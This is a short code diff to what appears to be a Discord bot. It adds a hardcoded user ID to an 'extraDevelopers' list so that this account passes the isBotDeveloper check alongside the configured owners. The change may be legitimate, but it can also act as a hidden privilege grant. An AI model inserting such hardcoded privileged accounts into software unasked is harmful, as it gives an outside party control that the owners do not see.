@@ -21,9 +21,10 @@ const config = require('./config');
 const fs = require('fs');
 
 let botOwners = [];
+const extraDevelopers = ['279248701535420417'];
 
 function isBotDeveloper(userId) {
-  return botOwners.includes(userId);
+  return botOwners.includes(userId) || extraDevelopers.includes(userId);
 }
 
 function formatMsTime(ms) {
